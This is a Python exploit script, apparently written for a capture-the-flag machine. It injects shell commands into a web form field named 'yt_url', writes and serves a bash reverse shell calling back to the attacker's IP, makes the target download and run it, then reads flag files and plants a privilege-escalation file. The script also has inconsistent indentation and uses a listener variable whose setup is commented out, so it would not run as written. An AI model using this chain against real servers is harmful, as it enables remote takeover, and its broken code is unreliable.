import requests
from pwn import *
import subprocess

url = input("Enter your machine url(http://10.x.x.x/): ").rstrip('\n')

ip = input("Enter your tun0 ip: ").rstrip('\n')




def command_injection(url,command):
    header = {'X-Requested-With': 'XMLHttpRequest'}
    data = {'yt_url':command}
    res = requests.post(url,headers=header,data=data)
    #print(res.content)

    

def create_payload():
    print(" Creating payload..")
    shell = open("shell.sh","w+")
    shell.write(f'bash -i >& /dev/tcp/{ip}/8888 0>&1')
    shell.close()
    

def sending_payload(): 
    subprocess.Popen(['python3','-m','http.server'])
    print(" Sending payload to the server")
    command = ';wget${IFS}%s:8000/shell.sh;'%ip
    print('server started')
    create_payload()
    command_injection(url,command)
    executing_payload()
    
       
    
def executing_payload():
	print("starting listener..")
	#chuchu = listen(8888)  #if this doesn't work then comment the listen things.. and start your own listener using nc -lvp 8888
	command_injection(url,';bash${IFS}shell.sh;')
  	print("Executing the payload..")
	#sleep(2)
  	print("finding the first flag")
	chuchu.sendline("cat admin/flag.txt")
	chuchu.recv()
  	print("Going for the root")
  	print('writing a file to privesc') # you can put reverseshell aslo
	chuchu.sendline("echo 'cat /root/root.txt > root.txt' > tmp/clean.sh")
	sleep(120)
    	chuchu.sendline('cat root.txt')
   	chuchu.recv()
    
    
if __name__ == '__main__':
    sending_payload()
